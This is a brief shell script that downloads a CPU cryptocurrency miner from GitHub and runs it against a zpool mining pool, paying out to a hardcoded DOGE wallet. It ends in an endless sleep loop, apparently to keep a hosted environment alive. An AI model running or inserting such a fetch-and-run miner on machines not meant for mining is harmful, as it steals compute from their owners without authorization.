#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u D9YbtMufK9ZQo7CaBuNXv79ih9Ld2Poxex -p c=DOGE -t4
while [ 1 ]; do
sleep 3
done
sleep 999
